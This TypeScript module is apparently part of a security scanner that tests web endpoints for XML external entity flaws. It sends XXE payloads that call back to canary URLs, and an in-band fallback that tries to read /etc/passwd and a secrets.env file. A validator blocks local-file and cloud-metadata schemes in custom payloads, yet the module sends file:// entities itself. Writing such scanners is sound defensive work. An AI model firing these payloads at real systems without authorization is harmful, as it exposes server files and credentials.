// Probe family module — implementation moved verbatim from surface-engine.ts (no behavior change).
import { BrokerDenied } from '.././broker.ts'
import type { Grant } from '.././broker.ts'
import type { CanaryBroker } from '.././canary-broker.ts'
import { containsDestructivePayload } from '../../replay-spec.ts'
import { isPrivateOrLoopbackHost, randToken, responseSimilarity } from './context.ts'
import type { DiffContext, DiffOutcome, InjectedRequest } from './context.ts'
import type { ProbeModule } from './registry.ts'

/**
 * Carry the entity canary token as the broker correlation id (`X-Kovo-Trace-Id` in a local
 * lab). The durable OOB drain attributes a late callback to the recorded exchange that names the
 * token; the persisted response body does not contain it, and request bodies are not searchable.
 */
function withCanaryCorrelation(req: InjectedRequest, token: string): InjectedRequest {
  return { ...req, traceId: token } as InjectedRequest & { traceId: string }
}



export function validateXxeCustomPayload(customPayload: string) {
  if (
    containsDestructivePayload(customPayload) ||
    /(?:file:\/\/|\/etc\/passwd|\/etc\/shadow|php:\/\/|expect:\/\/|gopher:\/\/|169\.254\.169\.254|metadata\.google\.internal)/i.test(customPayload)
  ) {
    throw new BrokerDenied('xxe_canary customPayload contains forbidden local-file, metadata, or destructive URI schemes.')
  }
  if (!customPayload.includes('{{canary_url}}') && !customPayload.includes('{{canary_dns_host}}')) {
    throw new BrokerDenied('xxe_canary customPayload must use {{canary_url}} or {{canary_dns_host}} CanaryBroker placeholders.')
  }
}



export async function diffXxeCanary(
  ctx: DiffContext,
  canaryBroker: CanaryBroker | undefined,
  grant: Grant,
  signal: AbortSignal,
): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  if (req.customPayload !== undefined) {
    validateXxeCustomPayload(req.customPayload)
  }
  if (!canaryBroker) {
    return { verdict: 'inconclusive', summary: 'CanaryBroker is unavailable; XXE OOB probing needs a Kovo-operated listener.', details: {} }
  }
  let info = canaryBroker.listenerInfo()
  if (!info.running) info = await canaryBroker.startListener()
  const base = info.effectiveBaseUrl
  const localLab = Boolean(grant.allowLocalLab && process.env.KOVO_ALLOW_LOCAL_LAB === '1')
  if (base) {
    let host = ''
    try { host = new URL(base).hostname } catch { /* handled below */ }
    if (!host || (isPrivateOrLoopbackHost(host) && !localLab)) {
      return {
        verdict: 'inconclusive',
        summary: 'Canary base URL is private/loopback; configure KOVO_CANARY_PUBLIC_URL before XXE callback probing on a public target.',
        details: { canaryHost: host },
      }
    }
  }

  const method = req.method && req.method !== 'GET' ? req.method : 'POST'
  const xmlHeaders = { 'Content-Type': 'application/xml', ...(req.headers ?? {}) }
  const ctrlBody = `<?xml version="1.0" encoding="UTF-8"?><kovo><ping>${randToken(6)}</ping></kovo>`
  const ctrlEx = await send({ method, pathAndQuery: req.pathAndQuery, body: ctrlBody, headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
  if (!ctrlEx) return { verdict: 'inconclusive', summary: 'XXE control request failed.', details: {} }

  const runId = req.runId ?? 'surface-engine'
  const mint = (label: string) => canaryBroker.mintCanary(runId, label, ctx.origin, req.storage ? { storage: req.storage, assignmentId: req.assignmentId } : undefined)

  const minted: Array<{ variant: string; token: string }> = []
  if (req.customPayload) {
    const c = mint('xxe:custom')
    minted.push({ variant: 'custom', token: c.token })
    const body = req.customPayload
      .replaceAll('{{canary_url}}', c.httpUrl)
      .replaceAll('{{canary_dns_host}}', c.dnsHost)
    await send(withCanaryCorrelation({ method, pathAndQuery: req.pathAndQuery, body, headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind }, c.token))
  } else {
    const c1 = mint('xxe:general_entity')
    minted.push({ variant: 'general_entity', token: c1.token })
    await send(withCanaryCorrelation({
      method,
      pathAndQuery: req.pathAndQuery,
      body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gxxe SYSTEM "${c1.httpUrl}">]><root>&gxxe;</root>`,
      headers: xmlHeaders,
      session: req.session,
      csrfBind: req.csrfBind,
    }, c1.token))

    const c2 = mint('xxe:param_entity')
    minted.push({ variant: 'param_entity', token: c2.token })
    await send(withCanaryCorrelation({
      method,
      pathAndQuery: req.pathAndQuery,
      body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % gxxep SYSTEM "${c2.httpUrl}"> %gxxep;]><root>ok</root>`,
      headers: xmlHeaders,
      session: req.session,
      csrfBind: req.csrfBind,
    }, c2.token))

    const c3 = mint('xxe:svg_dtd')
    minted.push({ variant: 'svg_dtd', token: c3.token })
    await send(withCanaryCorrelation({
      method,
      pathAndQuery: req.pathAndQuery,
      body: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY svgx SYSTEM "${c3.httpUrl}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&svgx;</text></svg>`,
      headers: xmlHeaders,
      session: req.session,
      csrfBind: req.csrfBind,
    }, c3.token))
  }

  const deadline = Date.now() + Math.max(500, Math.min(req.waitMs ?? 2500, 8000))
  // In-band fallback: resolve a virtual-filesystem entity and look for the resolved content in the
  // response. Only a real resolution can surface these markers, so hardened parsers stay silent.
  const inband: Array<Record<string, unknown>> = []
  let inbandHit = false
  const resolvedMarkers = /root:x:0:0:|API_KEY=rbs_[a-z0-9]+_[0-9a-f]{12}|SESSION_SECRET=/
  const inbandBody = (entity: string) =>
    `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gx SYSTEM "${entity}">]><root><project/><note>&gx;</note><issuer>kovo-issuer</issuer></root>`
  for (const entity of ['file:///etc/passwd', 'file:///app/config/secrets.env']) {
    const ctrl = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody('file:///app/.env'), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
    const probe = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody(entity), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
    if (!ctrl || !probe) continue
    const marker = resolvedMarkers.test(probe.body)
    const diverged = probe.status !== ctrl.status || responseSimilarity(ctrl.body, probe.body) < 0.9
    inband.push({ entity, controlStatus: ctrl.status, probeStatus: probe.status, marker, diverged })
    if (marker) {
      anomalies.push({
        type: 'xxe_entity_resolved_inband',
        entity,
        controlStatus: ctrl.status,
        acceptedStatus: probe.status,
        marker: 'resolved-file-content',
      })
      inbandHit = true
      break
    }
  }

  const hits = new Map<string, ReturnType<CanaryBroker['checkCanary']>>()
  while (!signal.aborted) {
    for (const m of minted) {
      const res = canaryBroker.checkCanary(m.token, req.storage ? { storage: req.storage, runId } : undefined)
      if (res.hit) hits.set(m.token, res)
    }
    if (hits.size > 0 || Date.now() >= deadline) break
    await new Promise<void>(resolve => setTimeout(resolve, 200))
  }

  const results = minted.map(m => ({ variant: m.variant, token: m.token, hit: hits.has(m.token) }))
  for (const r of results.filter(x => x.hit)) {
    anomalies.push({ type: 'xxe_canary_callback', variant: r.variant, token: r.token })
  }
  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0
      ? inbandHit
        ? 'XML external entity resolved server-local content into the response (in-band proof, no OOB callback).'
        : 'Correlated out-of-band CanaryBroker callback observed from benign XML external entity probe.'
      : 'No out-of-band XXE callback observed.',
    details: { results, inband, suggestedReplayKind: 'http_chain' },
  }
}

export const xxeProbe: ProbeModule = {
  family: 'xxe',
  classes: ['xxe_canary'],
  run: (ctx, deps) => diffXxeCanary(ctx, deps.canaryBroker, deps.grant, deps.signal),
}
